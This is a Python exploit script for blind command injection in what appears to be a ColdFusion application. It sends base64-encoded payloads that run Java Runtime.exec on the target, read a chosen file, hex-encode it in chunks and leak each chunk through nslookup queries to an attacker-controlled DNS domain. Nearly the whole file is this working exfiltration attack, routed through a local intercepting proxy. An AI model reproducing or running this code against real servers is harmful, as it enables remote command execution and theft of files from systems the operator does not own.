################################################################################################
#  Description:
#  A tool for executing DNS based commands through a blind CMD Injection vulnerability
#
################################################################################################

import requests
import urllib
import time
import sys
import base64
import enum
import secrets
import argparse

proxies = None
#Comment out if not using a proxy like Burp, etc
proxies = {
 'http': 'http://127.0.0.1:8080',
 'https': 'http://127.0.0.1:8080',
}

#Set to bypass errors if the target site has SSL issues
requests.packages.urllib3.disable_warnings()

class RequestVerb(enum.Enum):
    GET = 1
    POST = 2
    PUT = 3

def make_request( url, req_verb=RequestVerb.GET, req_params_dict="", header_dict=None ):

    error_count = 0
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'}

    # Add any additional headers
    if header_dict:
        headers.update(header_dict)

    resp = None
    while True:
        try:
            if req_verb == RequestVerb.GET:

                if len(req_params_dict) > 0:
                    url += "?"
                    for param in req_params_dict:
                        url += param + "=" + req_params_dict[param] + "&"
                resp = requests.get(url, headers=headers, proxies=proxies, verify=False)
            elif req_verb == RequestVerb.POST:
                headers.update({'Content-Type': 'application/x-www-form-urlencoded'} )
                resp = requests.post(url, data=req_params_dict, headers=headers, proxies=proxies, verify=False)
            elif req_verb == RequestVerb.PUT:
                headers.update({'Content-Type': 'application/x-www-form-urlencoded'} )
                resp = requests.put(url, headers=headers, data=req_params_dict, proxies=proxies, verify=False,)
            else:
                print("[-] Unknown request type. Aborting")
                return data_arr
            break
        except requests.exceptions.RequestException as e:
            # print(traceback.format_exc())
            error_count += 1
            if error_count > 3:
                print("[-] Error sending HTTP request.")
                # print(traceback.format_exc())
                break
            else:
                time.sleep(1)
                continue

    return resp


#def construct_payload(cmd, req_id):


def execute_cmd(file_path, dns_root):


    # Added to make each request unique-ish to avoid DNS caching
    req_str = secrets.token_hex(2)

    # Add the command, use simple while loop to execute nslookup on each line returned by xxd
    for chunk_idx in range(300):

        start_idx = (chunk_idx * 60) + 1
        cmd_str = 'createObject("java","java.lang.Runtime").getRuntime().exec("nslookup "&Mid(binaryEncode(FileReadBinary("%s"),"hex"),%d,60)&".%d.%s.%s")' % (file_path, start_idx, chunk_idx, req_str, dns_root)
  
        exploit = get_payload(cmd_str)
        #print(exploit)

        # Set the parameters
        param_dict = {vuln_param_name : exploit}

        # Add any other params
        param_dict.update(additional_params)

        resp = make_request(url, req_verb, param_dict)


    # Semd closing request
    cmd_str = 'createObject("java","java.lang.Runtime").getRuntime().exec("nslookup _._.%s.%s")' % (req_str, dns_root)

    exploit = get_payload(cmd_str)
    #print(exploit)

    # Set the parameters
    param_dict = {vuln_param_name : exploit}

    # Add any other params
    param_dict.update(additional_params)

    resp = make_request(url, req_verb, param_dict)


# Get length of command
def get_payload(cmd):

    cmd_str = cmd
    b64_str_cmd = base64.b64encode(cmd_str.encode()).decode()

    return b64_str_cmd


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='Consort - Helper server for exploit interaction')
    parser.add_argument('-c', help="Command", required=True)


    # Set variables
    args = parser.parse_args()
    cmd = args.c
    #cmd = "ifconfig"

    dns_root = "m.dns.controlled.com"

    #Target URL
    url = "https://example.com"

    # Set Request Type
    req_verb = RequestVerb.GET

    #Set this to the parameter name for the GET request
    vuln_param_name = "y"

    #Additional params
    additional_params = {"some(Evaluate(ToString(ToBinary(url.y))))":"392402"}

    execute_cmd(cmd, dns_root)

